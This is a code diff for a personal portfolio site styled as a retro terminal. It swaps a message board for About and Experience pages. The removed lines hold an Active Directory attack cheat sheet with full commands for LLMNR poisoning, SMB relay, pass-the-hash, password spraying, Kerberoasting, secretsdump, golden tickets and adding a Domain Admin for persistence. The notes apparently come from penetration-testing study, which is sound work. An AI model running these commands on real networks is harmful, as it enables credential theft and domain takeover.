@@ -403,50 +403,48 @@
 			}
 
 			renderMainMenu() {
-				const menu = [
+				const banner = [
+					"██╗   ██╗ ██████╗ ███████╗    ██╗   ██╗██╗██████╗ ███████╗███╗   ███╗██╗   ██╗███████╗",
+					"██║   ██║██╔═══██╗██╔════╝    ██║   ██║██║██╔══██╗██╔════╝████╗ ████║██║   ██║██╔════╝",
+					"██║   ██║██║   ██║███████╗    ██║   ██║██║██║  ██║█████╗  ██╔████╔██║██║   ██║███████╗",
+					"╚██╗ ██╔╝██║   ██║╚════██║    ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║╚════██║",
+					" ╚████╔╝ ╚██████╔╝███████║     ╚████╔╝ ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝███████║",
+					"  ╚═══╝   ╚═════╝ ╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝",
 					"",
-					"    ╔══════════════════════════════╗",
-					"    ║  MAINFRAME DIRECTORY         ║",
-					"    ╚══════════════════════════════╝",
-					"",
-					"  [ 1 ] MESSAGE BOARD",
-					"  [ 2 ] FILE AREA",
-					"  [ 3 ] PROJECTS / WHO AM I",
-					"  [ 4 ] GUESTBOOK",
-					"",
-					"  [ 0 ] LOG OFF",
+					"┌──────────────────────────────────────────────────────────────────────────────────────┐",
+					"│                                                                                      │",
+					"│  [ 1 ] ABOUT                                                                         │",
+					"│  [ 2 ] EXPERIENCE                                                                    │",
+					"│                                                                                      │",
+					"│  [ 0 ] LOG OFF                                                                       │",
+					"│                                                                                      │",
+					"└──────────────────────────────────────────────────────────────────────────────────────┘",
 					"",
 				];
 
-				this.mainMenu.innerHTML = menu
+				this.mainMenu.innerHTML = banner
 					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
 					.join("");
 
-				this.updateHint("[1-4] select | [0] exit | [ESC] return");
+				this.updateHint("[1-2] select | [0] exit | [ESC] return");
 			}
 
 			handleMenuSelection(key) {
-				if (this.state.mode === "message-board" && key === "1") {
-					this.showPost(0);
+				if (this.state.mode === "about" && key === "0") {
+					this.showMainMenu();
 					return;
 				}
-				if (this.state.mode === "post-view" && key === "0") {
-					this.showMessageBoard();
+				if (this.state.mode === "experience" && key === "0") {
+					this.showMainMenu();
 					return;
 				}
 
 				switch (key) {
 					case "1":
-						this.showMessageBoard();
+						this.showAbout();
 						break;
 					case "2":
-						this.showFileArea();
-						break;
-					case "3":
-						this.showProjects();
-						break;
-					case "4":
-						this.showGuestbook();
+						this.showExperience();
 						break;
 					case "0":
 						this.logOff();
@@ -454,269 +452,33 @@
 				}
 			}
 
-			wrapText(text, width = 70) {
-				const wrapped = [];
-				const lines = text.split("\n");
 
-				for (const line of lines) {
-					if (line.length <= width) {
-						wrapped.push(line);
-					} else {
-						// Wrap long lines
-						let remaining = line;
-						while (remaining.length > width) {
-							let breakPoint = width;
-							// Try to break at a space
-							const spaceIndex = remaining.lastIndexOf(" ", width);
-							if (spaceIndex > width * 0.6) {
-								breakPoint = spaceIndex;
-							}
-							wrapped.push(remaining.substring(0, breakPoint));
-							remaining = remaining.substring(breakPoint).trim();
-						}
-						if (remaining) wrapped.push(remaining);
-					}
-				}
-				return wrapped;
-			}
-
-			showPost(index) {
-				this.state.mode = "post-view";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const posts = [
-					{
-						title: "Active Directory Exploitation Guide",
-						date: "2026-06-20",
-						content: `LAB ENVIRONMENT
-2HYDRA-DC         10.0.2.250
-punisher          10.0.2.220
-spiderman         10.0.2.221
-
-ATTACK METHODOLOGY
-1. Start with mitm6 and responder
-2. Scan to generate traffic
-3. Check websites for alternate paths
-4. Look for default creds
-5. Enumerate further based on findings
-
-Use responder on Linux, Inveigh on Windows
-
-LLMNR POISONING
-Machines in AD request access to services
-that don't exist. Attacker requests user:hash
-credentials. Target sends hash for cracking.
-
-Command: sudo responder -I <adapter> -dPv
-
-HASHCAT ATTACK MODES
-- Wordlist: hashcat -a 0 -m 400 hash dict
-- Wordlist+Rules: hashcat -a 0 -m 0 hash
-  dict -r rules/best64.rule
-- Brute-Force: hashcat -a 3 -m 0 hash
-  ?a?a?a?a?a?a
-- Combinator: hashcat -a 1 -m 0 hash
-  dict1 dict2
-
-SMB RELAY (PASS-THE-HASH)
-Use responder to catch and relay hashes.
-
-Detect vulnerable targets:
-nmap --script=smb2-security-mode.nse
-  -p 445 <target>
-
-Look for: Message signing enabled but not
-required
-
-Setup relay:
-sudo ntlmrelayx.py -tf targets.txt
-  -smb2support
-sudo impacket-ntlmrelayx -tf targets.txt
-  -smb2support -i
-
-Connect: nc 127.0.0.1 11000
-
-SHELL ACCESS
-Once you have password or hash:
-
-PSExec:
-impacket-psexec <domain>/<user>:
-  '<pass>'@<DC-IP>
-
-PSExec with hash:
-impacket-psexec <user>@<DC-IP>
-  -hashes <LM>:<NT>
-
-INVEIGH (Windows)
-Import-Module .\\Inveigh.ps1
-Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y
-  -FileOutput Y
-
-PASSWORD ATTACKS
-WARNING: Max 5 attempts to avoid lockouts!
-
-Enumeration:
-- crackmapexec smb <DC-IP> -u <user>
-  -p <pass> --pass-pol
-- rpcclient -U "" -N <DC-IP>
-- enum4linux -P <DC-IP>
-- enum4linux-ng -P <DC-IP> -oA <output>
-
-KERBRUTE (User Enumeration)
-kerbrute userenum -d <Domain>
-  --dc 172.16.5.5 users.txt
-
-PASSWORD SPRAYING (Linux)
-for u in $(cat users.txt); do
-  rpcclient -U "$u%Pass123"
-  -c "getusername;quit" <DC>
-  | grep Authority
-done
-
-crackmapexec smb <DC-IP> -u users.txt
-  -p Password123 | grep +
-
-WINDOWS SECURITY CONTROLS
-- Get-MpComputerStatus (Defender)
-- Get-AppLockerPolicy (Whitelist)
-- $ExecutionContext.SessionState.LanguageMode
-
-LAPS PASSWORD SOLUTION
-Find-LAPSDelegatedGroups
-Find-AdmPwdExtendedRights
-Get-LAPSComputers
-
-CREDENTIALED ENUMERATION
-crackmapexec smb <DC-IP> -u <user>
-  -p <pass> --users --groups
-smbmap -u <user> -p <pass> -d <domain>
-  -H <DC-IP>
-rpcclient -U "" -N <DC-IP> enumerate
-windapsearch.py --dc-ip <DC-IP>
-  -u <user>@<domain> -p <pass> --da
-
-KERBEROASTING
-Grab SPN hashes:
-impacket-GetUserSPNs <DOMAIN/user:pass>
-  -dc-ip <ip> -request
-
-Crack: hashcat -m 13100 hashes.txt
-  wordlist.txt
-
-Fix clock skew: sudo ntpdate -du <DC IP>
-
-TOKEN IMPERSONATION
-meterpreter > use incognito
-meterpreter > list_tokens -u
-meterpreter > impersonate_token DOMAIN
-  \\Administrator
-
-IPv6 DNS TAKEOVER
-sudo mitm6 -d <domain>
-impacket-ntlmrelayx -6
-  -t ldaps://<DC-IPv4>
-  -wh <fakeservice>.<domain>.local
-  -l <loot>
-
-Extract secrets:
-impacket-secretsdump <DOMAIN/USER:PASS>@<DC>
-
-GOLDEN TICKET
-You need: SID and krbtgt hash
-
-privilege::debug
-lsadump::lsa /inject /name:krbtgt
-kerberos::golden /User:<User>
-  /domain:<domain> /sid:<SID>
-  /krbtgt:<krbtgt> /id:500 /ptt
-
-misc::cmd (open shell in mimikatz)
-
-POST-DOMAIN COMPROMISE
-1. Total control achieved
-2. Provide additional value
-3. Add persistence
-
-Create user:
-net user /add <user> <pass> /domain
-net group "Domain Admins" <user>
-  /ADD /DOMAIN
-
-NTDS.dit EXTRACTION
-Run on DC: impacket-secretsdump LOCAL
-  -system registry_SYSTEM
-  -ntds registry_NTDS.dit
-
-Crack: hashcat -m 1000 hashes.txt
-  wordlist.txt
-
-EXPLOIT CHECKLIST
-- ZeroLogon: Scanner only, don't run
-- PrintNightmare: Scan only
-- Always document findings thoroughly`
-					}
-				];
-
-				const post = posts[index];
-				const wrappedLines = this.wrapText(post.content.trim(), 70);
-				const content = [
-					"",
-					"    ╔══════════════════════════════╗",
-					`    ║ ${post.title.substring(0, 28).padEnd(28)} ║`,
-					"    ╚══════════════════════════════╝",
-					"",
-					...wrappedLines,
-					"",
-					"  [ 0 ] back to message board",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[0] back | [ESC] exit");
-			}
-
-			showMessageBoard() {
-				this.state.mode = "message-board";
+			showAbout() {
+				this.state.mode = "about";
 				this.mainMenu?.classList.remove("active");
 				this.menuArea?.classList.add("active");
 
 				const content = [
 					"",
-					"    ╔══════════════════════════════╗",
-					"    ║    MESSAGE BOARD             ║",
-					"    ╚══════════════════════════════╝",
-					"",
-					"  [ 1 ] AD exploitation guide   2026-06-20",
-					"",
-					"  [1] read | [0] main menu",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[1] read | [0] main menu | [ESC] exit");
-			}
-
-			showFileArea() {
-				this.state.mode = "file-area";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const content = [
-					"",
-					"    ╔══════════════════════════════╗",
-					"    ║      FILE AREA               ║",
-					"    ╚══════════════════════════════╝",
-					"",
-					"  [ 1 ] ConnorDedicResume.pdf   120 KB",
-					"",
-					"  [1] select | [0] main menu",
+					"┌──────────────────────────────────────────────────────────────────────────────────────┐",
+					"│  ABOUT                                                                               │",
+					"├──────────────────────────────────────────────────────────────────────────────────────┤",
+					"│                                                                                      │",
+					"│  Cyber Deception Engineer at Space Dynamics Laboratory.                              │",
+					"│                                                                                      │",
+					"│  Specialized in Windows malware development, Active Directory exploitation, and      │",
+					"│  offensive tooling. Contributing researcher on novel cyber deception techniques.     │",
+					"│                                                                                      │",
+					"│  SOC analyst, CTF creator, and BS Cybersecurity (BYU-Idaho, graduating July 2026).   │",
+					"│                                                                                      │",
+					"│  Skills span C, Python, Go, PowerShell, Bash, and JavaScript with deep expertise in  │",
+					"│  AWS, Docker, Git, and Active Directory.                                             │",
+					"│                                                                                      │",
+					"│  Certifications: AWS Cloud Practitioner, Security+, PenTest+, CySA+, PNPT.          │",
+					"│                                                                                      │",
+					"│  [ 0 ] MAIN MENU                                                                     │",
+					"│                                                                                      │",
+					"└──────────────────────────────────────────────────────────────────────────────────────┘",
 					"",
 				];
 
@@ -727,32 +489,34 @@ EXPLOIT CHECKLIST
 				this.updateHint("[0] main menu | [ESC] exit");
 			}
 
-			showProjects() {
-				this.state.mode = "projects";
+			showExperience() {
+				this.state.mode = "experience";
 				this.mainMenu?.classList.remove("active");
 				this.menuArea?.classList.add("active");
 
 				const content = [
 					"",
-					"    ╔══════════════════════════════╗",
-					"    ║  PROJECTS / WHO AM I         ║",
-					"    ╚══════════════════════════════╝",
-					"",
-					"  Cyber Deception Engineer at SDL.",
-					"  Specialist in Windows malware,",
-					"  AD exploitation, and offensive",
-					"  tooling in C, Python, and Go.",
-					"",
-					"  CTF creator. Red team researcher.",
-					"  Contributing to cyber deception",
-					"  research publication.",
-					"",
-					"  CONTACT:",
-					"  Email    : connordedicpro@gmail.com",
-					"  GitHub   : github.com/ConnorDedic",
-					"  LinkedIn : linkedin.com/in/connor-dedic",
-					"",
-					"  [ 0 ] main menu",
+					"┌──────────────────────────────────────────────────────────────────────────────────────┐",
+					"│  EXPERIENCE                                                                          │",
+					"├──────────────────────────────────────────────────────────────────────────────────────┤",
+					"│                                                                                      │",
+					"│  [ CURRENT ROLE ]                                                                    │",
+					"│  Cyber Deception Engineer - Space Dynamics Laboratory (Jan–May 2026)                │",
+					"│  └─ Cataloged and developed cyber deception techniques                               │",
+					"│  └─ Conducted research on novel approaches across AI, ICS, AD, and bespoke systems  │",
+					"│  └─ Contributing to upcoming published paper on cyber deception                     │",
+					"│                                                                                      │",
+					"│  [ EXPERTISE ]                                                                       │",
+					"│                                                                                      │",
+					"│  OFFENSIVE: Windows malware, AD exploitation, red team operations, reverse eng      │",
+					"│  └─ Impacket, BloodHound, Mimikatz, Empire, custom tooling                          │",
+					"│                                                                                      │",
+					"│  DEFENSIVE: SOC operations, threat hunting, incident response, detection            │",
+					"│  └─ Splunk, Palo Alto, Crowdstrike, Suricata, Security Onion                       │",
+					"│                                                                                      │",
+					"│  [ 0 ] MAIN MENU                                                                     │",
+					"│                                                                                      │",
+					"└──────────────────────────────────────────────────────────────────────────────────────┘",
 					"",
 				];
 
@@ -763,58 +527,6 @@ EXPLOIT CHECKLIST
 				this.updateHint("[0] main menu | [ESC] exit");
 			}
 
-			showGuestbook() {
-				this.state.mode = "guestbook";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const content = [
-					"",
-					"    ╔══════════════════════════════╗",
-					"    ║     GUESTBOOK                ║",
-					"    ╚══════════════════════════════╝",
-					"",
-					"  Last visitors:",
-					"",
-					"  > anonymouse (2026-06-29 14:22)",
-					"  > h4x0r_ph34r (2026-06-29 13:15)",
-					"  > netrunner99 (2026-06-29 11:08)",
-					"",
-					"  [ 0 ] main menu",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[0] main menu | [ESC] exit");
-			}
-
-			showWhosOnline() {
-				this.state.mode = "whos-online";
-				this.mainMenu?.classList.remove("active");
-				this.menuArea?.classList.add("active");
-
-				const content = [
-					"",
-					"    ╔══════════════════════════════╗",
-					"    ║    WHO'S ONLINE              ║",
-					"    ╚══════════════════════════════╝",
-					"",
-					"  > SYSOP (idle 2m)",
-					"  > you (active)",
-					"",
-					"  [ 0 ] main menu",
-					"",
-				];
-
-				this.menuArea.innerHTML = content
-					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
-					.join("");
-
-				this.updateHint("[0] main menu | [ESC] exit");
-			}
 
 			logOff() {
 				document.body.classList.remove("bbs-active");
